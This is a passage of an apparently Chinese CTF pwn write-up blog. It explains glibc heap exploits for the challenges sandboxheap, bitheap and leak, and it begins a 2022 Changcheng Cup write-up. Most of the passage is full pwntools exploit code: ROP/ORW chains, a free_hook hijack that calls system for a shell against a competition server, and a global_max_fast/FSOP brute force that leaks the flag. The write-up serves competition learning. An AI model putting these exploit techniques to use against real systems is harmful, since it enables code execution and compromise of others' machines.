class="number">0x98</span>*<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line"></span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">p.recvuntil(<span class="number">0x98</span>*<span class="string">&quot;\xff&quot;</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;heap_addr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+(<span class="built_in">bin</span>(<span class="number">0x0</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode())+(<span class="built_in">bin</span>(<span class="number">0x101</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode())+(<span class="built_in">bin</span>(free_hook)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x80</span>)</span><br><span class="line"><span class="comment">#rsp heap_addr+0x640 0xa0</span></span><br><span class="line"><span class="comment">#rsi heap_addr+0x6b0 0x70</span></span><br><span class="line"><span class="comment">#rdi heap_addr+0x6a8 0x68</span></span><br><span class="line"><span class="comment">#rdx heap_addr+0x6c8 0x88</span></span><br><span class="line"><span class="comment">#rcx heap_addr+0x6e8 0xa8</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002164f</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000023a6a</span></span><br><span class="line">pop_rdx_r12_ret = libc_base + <span class="number">0x0000000000130514</span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x000000000001b500</span></span><br><span class="line">syscall = libc_base + <span class="number">0x00000000000d2625</span></span><br><span class="line"></span><br><span class="line">payload=(<span class="built_in">bin</span>(<span class="number">0x110020</span>+libc_base)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])</span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0xdeadbeef</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])*<span class="number">12</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0x0</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rdi</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(heap_addr+<span class="number">0x640</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rsi</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0xdeadbeef</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])*<span class="number">3</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0x800</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rdx</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0xdeadbeef</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])*<span class="number">1</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(heap_addr+<span class="number">0x648</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rsp</span></span><br><span class="line">payload+=(<span class="built_in">bin</span>(<span class="number">0x110020</span>+libc_base)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])<span class="comment">#rcx</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">bin</span>(context_addr)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>]</span><br><span class="line">edit(<span class="number">14</span>,payload)</span><br><span class="line"></span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xED6</span>,<span class="number">0xEE2</span>,<span class="number">0xEEE</span>,<span class="number">0xEFA</span>,<span class="number">0xC9F</span>,<span class="number">0xBA7</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line"></span><br><span class="line">orw = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)</span><br><span class="line">orw+=p64(pop_rax_ret)+p64(<span class="number">0x2710</span>)</span><br><span class="line">orw+=p64(syscall)</span><br><span class="line">orw+=p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(libc_base + libc.symbols[<span class="string">&#x27;close&#x27;</span>])</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(heap_addr + <span class="number">0x7f0</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_addr + <span class="number">0x5b0</span>)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(pop_rsi_ret) + p64(heap_addr + <span class="number">0x5b0</span>)</span><br><span class="line">orw += p64(pop_rdx_r12_ret) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(pop_rax_ret) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall)</span><br><span class="line">pause()</span><br><span class="line">p.send(orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p><img src="/../img/image-20221030171048862.png" alt="image-20221030171048862"></p>
<h2 id="bitheap"><a href="#bitheap" class="headerlink" title="bitheap"></a>bitheap</h2><p>这个题就是没加沙箱的sandboxheap，一模一样</p>
<p>而且比较巧的是，setcontext和分析沙箱规则都是比赛期间现学的，在打rop链之前，我专门去写了一个劫持free_hook写入system地址然后获取shell的脚本(没给这题开沙箱)，而且还当时专门保留了一份</p>
<p>思路同上题一样，不过最后写入的是system地址而非setcontext+53，脚本如下:</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h3><p><a href="https://zikh26.github.io/posts/ad411136.html">tools-函数库 | ZIKH26’s Blog</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))   </span><br><span class="line">    </span><br><span class="line">p,e,libc=load(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;47.95.3.91:23899&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">    add(i,<span class="number">0x88</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)    </span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)<span class="comment">#merge chunk   </span></span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+<span class="string">b&#x27;00000100&#x27;</span>+<span class="string">b&#x27;10000000&#x27;</span>+<span class="string">b&#x27;00000000&#x27;</span>*<span class="number">6</span>+<span class="string">b&#x27;00000000&#x27;</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment">#堆块合并</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0xa0</span>)</span><br><span class="line">show(<span class="number">12</span>)</span><br><span class="line">leak_libc=recv_libc()</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3ebe40</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">free_hook=libc_base+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">sys_addr=libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">log_addr(<span class="string">&#x27;free_hook&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;1&#x27;</span>*(<span class="number">0x80</span>*<span class="number">8</span>)+(<span class="built_in">bin</span>(<span class="number">0x0</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode())+(<span class="built_in">bin</span>(<span class="number">0x101</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode())+(<span class="built_in">bin</span>(free_hook)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x80</span>)</span><br><span class="line">payload=<span class="built_in">bin</span>(<span class="number">0x68732f6e69622f</span>)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>]</span><br><span class="line">edit(<span class="number">12</span>,payload)</span><br><span class="line">add(<span class="number">14</span>,<span class="number">0x80</span>)</span><br><span class="line">payload=<span class="built_in">bin</span>(sys_addr)[<span class="number">2</span>:].rjust(<span class="number">64</span>,<span class="string">&#x27;\x00&#x27;</span>).encode()[::-<span class="number">1</span>]</span><br><span class="line">edit(<span class="number">14</span>,payload)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0xED6</span>,<span class="number">0xEE2</span>,<span class="number">0xEEE</span>,<span class="number">0xEFA</span>,<span class="number">0xC9F</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>本地获取shell的情况，同样打远程也ok(或者拿着sandboxheap的exp直接打也行)</p>
<img src="../img/image-20221031122947443.png" alt="image-20221031122947443" style="zoom:50%;" />



<h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><h3 id="保护策略：-2"><a href="#保护策略：-2" class="headerlink" title="保护策略："></a>保护策略：</h3><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037951.png" alt="image-20221031162148626" style="zoom:50%;" />

<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037952.png" alt="image-20221031162709412" style="zoom:50%;" />

<p>emmm这个沙箱，感觉开了和没开一样。</p>
<h3 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h3><p>在delete函数里存在UAF漏洞(如下)</p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037953.png" alt="image-20221031171824181" style="zoom:50%;" />

<p>然后这道题没有show函数，而且没有puts等io输出函数，程序的所有输出都是自己用write函数来封装的，因此我们无法在这道题打IO leak泄露libc地址。</p>
<p>发现这道题其实已经将flag读到了一个堆块里(如下)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037954.png" alt="image-20221031172450922"></p>
<p>另外值得一提的就是在add函数里申请堆块的时候，最大可以申请到0x60000的堆块。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037955.png" alt="image-20221031172603962"></p>
<h3 id="利用思路：-2"><a href="#利用思路：-2" class="headerlink" title="利用思路："></a>利用思路：</h3><p>因为这道题已经将flag读到堆块里了，所以我们应该考虑如何输出堆块里的数据。在exit退出的时候，会刷新IO_list_all链表上的所有文件流，而在刷新的时候_IO_2_1_stderr结构体中的_IO_write_base字段与_IO_write_ptr字段之间如果存在数据的话，就会将其输出出来，如果我们能让这两个字段之间包含了存flag的那个堆块，在程序退出的时候就可以打印出来flag了。</p>
<h4 id="篡改global-max-fast"><a href="#篡改global-max-fast" class="headerlink" title="篡改global_max_fast"></a>篡改global_max_fast</h4><p>这样的话我们需要向stderr结构体里写入两个堆地址，于是思路是我们将global_max_fast改为一个大数，导致fastbinsY数组的溢出，计算好目标地址和fastbin数组之间的偏移，申请一个对应size的堆块，就可以让堆地址写入到目标地址了。</p>
<p>这里简单叙述下讲堆地址写入目标地址的原理:</p>
<blockquote>
<p>各类的bins的首地址都记录在了main_arena上，而fastbinY数组就是用来记录fastbin各个链的首地址。这个fastbinY数组定义的是10，所以理论上0xb0以内的堆块分到fastbbin中(但事实上fastbin正常情况最大的链为0x80)。而global_max_fast的作用表明了fastbin索引的阈值，如果我们能控制global_max_fast将其改为一个大数的话(假设改成0x1000)，再次释放掉一个0x500的堆块，那么该堆块就会进入fastbinY[0x4e]的位置(0x4e&#x3D;&#x3D;(0x500-0x20)&#x2F;0x10)，此时就会在fastbinY[0x4e]的地址留下一个堆地址。而fastbinY[0x4e]很明显是数组越界了，所以这个手法能在fastbinY数组的高地址去写入一个堆地址。</p>
</blockquote>
<p>这道题我们所需要的也就是在stderr结构体里写入两个堆地址，具体的size计算方法为</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">fastbin_ptr = main_arena_addr + <span class="number">8</span> <span class="comment">#fastbinY数组的地址就是main_arena+8的位置</span></span><br><span class="line">index = (target_addr-fastbin_ptr)/<span class="number">8</span><span class="comment">#target_addr是我们希望将堆地址写入目标地址</span></span><br><span class="line">size = index*<span class="number">0x10</span> + <span class="number">0x20</span><span class="comment">#最后将其size大小的堆块释放掉，就可以让目标地址里写入一个堆地址(前提是global_max_fast要比index大)</span></span><br></pre></td></tr></table></figure>



<p>剩下的部分就较为简单了，我们只需要将global_max_fast和_IO_2_1_stderr申请出来，将前者改大，后者用于edit改写stderr的base字段的末尾(因为此处写入的堆地址并不是存储flag的那个堆块，所以需要最后用edit来修改一下该地址的低字节)。</p>
<h4 id="申请global-max-fast-amp-amp-stderr"><a href="#申请global-max-fast-amp-amp-stderr" class="headerlink" title="申请global_max_fast&amp;&amp;stderr"></a>申请global_max_fast&amp;&amp;stderr</h4><p>因为没有libc地址，所以我们需要借助unsorted bin的fd和bk指针main_arena+96再爆破下低字节从而做出来global_max_fast和stderr。此处操作的思路如下:</p>
<blockquote>
<p>add chunk1 0x80<br>add chunk2 0x80<br>add chunk3 0x80<br>add chunk4 0x410 #不考虑与top chunk合并<br>delete 1<br>delete 3<br>delete 2<br>delete 4</p>
<p>此时的bins情况为<br>tcache bin 0x90 :chunk2-&gt;chunk3-&gt;chunk1<br>unsorted bin:chunk4-&gt;main_arena+96</p>
<p>我们利用uaf+edit篡改chunk2的fd指针的低字节，将本来的chunk3改成chunk4<br>于是tcache bin 0x90:chunk2-&gt;chunk4-&gt;main_arena+96<br>再编辑chunk4，去修改main_arena+96的低字节，将其改为global_max_fast，最后即可申请出来global_max_fast</p>
</blockquote>
<p>而申请出来stderr的方法同上，我是将unsorted bin的fd改成了global_max_fast bk改为了stderr结构体(如下)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037956.png" alt="image-20221031183209848"></p>
<p><strong>注意:由于这样申请出来会破坏unsorted bin，所以在破坏之前，我们需要把之后用到的所有堆块先全部申请出来</strong></p>
<p>把上面两个地址申请出来后，最后释放掉size为0x14b0和0x14c0的两个堆块，即可将两个堆地址写入stderr结构体中(情况如下)</p>
<img src="../img/image-20221031183654159.png" alt="image-20221031183654159" style="zoom:50%;" />



<p>因为之前我们将stderr结构体申请出来了，此时自然可以编辑它，将base字段的末尾改到装有flag的堆块低地址处，最后执行exit函数即可获取flag(不过最终脚本需要爆破，概率为1&#x2F;256)</p>
<h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP:"></a>EXP:</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">9</span>,<span class="number">0xb0</span>)<span class="comment">#chunk9</span></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x70</span>)<span class="comment">#chunk0</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x410</span>)<span class="comment">#chunk1</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x70</span>)<span class="comment">#chunk2</span></span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x70</span>)<span class="comment">#chunk3</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">7</span>,<span class="number">0xb0</span>)<span class="comment">#chunk7</span></span><br><span class="line">    add(<span class="number">10</span>,<span class="number">0x410</span>)<span class="comment">#chunk10</span></span><br><span class="line">    add(<span class="number">15</span>,<span class="number">0x14b0</span>)</span><br><span class="line">    add(<span class="number">14</span>,<span class="number">0x14c0</span>)</span><br><span class="line">    add(<span class="number">8</span>,<span class="number">0xb0</span>)<span class="comment">#chunk8</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">3</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#chunk2-&gt;chunk0-&gt;chunk3</span></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    delete(<span class="number">10</span>)</span><br><span class="line">    <span class="comment">#chunk8-&gt;chunk7-&gt;chunk9</span></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">2</span>,<span class="string">&#x27;\xe0&#x27;</span>)<span class="comment">#unsorted bin chunk get into tcache bin</span></span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;\x40\xf9&#x27;</span>)<span class="comment">#tamper main_arena+96 to global max fast</span></span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">&#x27;\xc8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">&#x27;\x80\xe6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">4</span>,<span class="number">0x70</span>)</span><br><span class="line">    add(<span class="number">5</span>,<span class="number">0x70</span>)</span><br><span class="line">    add(<span class="number">6</span>,<span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">0x7fff</span>))</span><br><span class="line"></span><br><span class="line">    add(<span class="number">11</span>,<span class="number">0xb0</span>)</span><br><span class="line">    add(<span class="number">12</span>,<span class="number">0xb0</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">13</span>,<span class="number">0xb0</span>)<span class="comment">#stderr</span></span><br><span class="line">    debug(p,<span class="string">&#x27;pie&#x27;</span>,<span class="number">0x23E3</span>,<span class="number">0x23EF</span>,<span class="number">0x2297</span>,<span class="number">0x23FB</span>)</span><br><span class="line">    delete(<span class="number">14</span>)</span><br><span class="line">    delete(<span class="number">15</span>)</span><br><span class="line">    payload=p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00\x90&#x27;</span></span><br><span class="line">    edit(<span class="number">13</span>,payload)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p,e,libc=load(<span class="string">&quot;leak&quot;</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;-------------&gt;&#x27;</span>+<span class="built_in">str</span>(cnt))</span><br><span class="line">    cnt=cnt+<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012037957.png" alt="image-20221031183954894"></p>
]]></content>
      <categories>
        <category>赛题WP</category>
      </categories>
      <tags>
        <tag>one_gadget</tag>
        <tag>爆破</tag>
        <tag>沙箱逃逸</tag>
        <tag>off by null</tag>
        <tag>orw</tag>
      </tags>
  </entry>
  <entry>
    <title>2022-长城杯-铁人三项赛 pwn wp</title>
    <url>/posts/62896955.html</url>
    <content><![CDATA[<p>题确实不难，但确实比赛没写出来，可惜差了一点，要是再给半个小时或者一个小时应该就出了，最后卡在一个奇奇怪怪的点（就是 <code>global_max_fast</code> 为了避免写进去 <code>0xdeadbeef</code> 有点大，就用了 <code>global_max_fast - 1</code> 这个地址写入的，结果不知道为啥后面 <code>free</code> 掉堆块后，里面的数据直接没了）浪费了很多时间</p>
<span id="more"></span>

<h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301102012422.png" alt="image-20230110201221051"></p>
<h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301102014013.png" alt="image-20230110201433955"></p>
<p>这里可以泄露程序基地址，但是在这道题里没有什么用。</p>
<p>在 <code>add</code> 函数中，向堆块里写入数据的时候，没有用 <code>\x00</code> 来截断，同时可以 <code>malloc</code> 的 <code>size</code> 范围比较大，可以让堆块进入 <code>large bin</code> 中，因此这里的漏洞可以泄露 <code>libc</code> 和 <code>heap</code> 地址。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301102015283.png" alt="image-20230110201520208"></p>
<p>在 <code>edit</code> 函数中存在数组溢出，此处的 <code>buf</code> 数组为 <code>__int64</code> 的类型（八字节），所以 <code>buf</code> 的数组实际只有 <code>0x20</code> 个字节，因此可以溢出八个字节控制 <code>v2</code> ，而 <code>*v2=0xdeadbeef</code> 就相当于任意地址（因为 <code>v2</code> 可控）写入一个 <code>0xdeadbeef</code> 。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202301102017087.png" alt="image-20230110201742011"></p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><p>很明显 <code>0xdeadbeef</code> 本身没有任何意义，因此考虑这里是让我们改大某处地址里存放的数据，首先想到的就是更改 <code>global max fast</code> 为 <code>0xdeadbeef</code> ，这样就可以在任意一个 <code>libc</code> 地址里写入一个 <code>heap</code> 地址。而此处比赛的时候想到的攻击是劫持 <code>vtable</code> 或者劫持 <code>IO_FILE</code> ，不过想了一会发现还是只能劫持 <code>IO_FILE</code> （应该是没法控制 <code>flags</code> 字段的）</p>
<p>然后打 <code>FSOP</code> ，这里有两种思路，第一个是伪造两次 <code>IO_FILE</code> ，让第一个伪造的 <code>IO_FILE</code> 的<code>_chain</code> 字段指向第二个 <code>IO_FILE</code> ，因为当时考虑的是第一个 <code>IO_FILE</code> 的 <code>flags</code> 字段没法控制，于是还得再伪造一个 <code>IO_FILE</code> （但事实是，这里的 <code> flags</code>可以控制的）</p>
<h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>这里说一下伪造两个 <code>IO_FILE</code> 需要伪造的字段。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">     <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">			    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure>

<p>在第一个结构体中，我们不希望执行 <code>_IO_OVERFLOW</code> 因此，要让前面的检查不通过。而前面的条件又由一个 <code>||</code> 连接，因此需要第一个条件和第二个条件全部不成立才可以。</p>
<p>这里伪造的字段为 <code>fp-&gt;_mode == 0</code> <code>fp-&gt;_IO_write_ptr== fp-&gt;_IO_write_base==0</code></p>
<p>这样前后两个条件全部无法成立，自然无法调用 <code>_IO_OVERFLOW</code> </p>
<p>在伪造字段绕过 <code>if</code> 的同时，不要忘记设置好 <code>_chain</code> 字段，让其指向第二个结构体。</p>
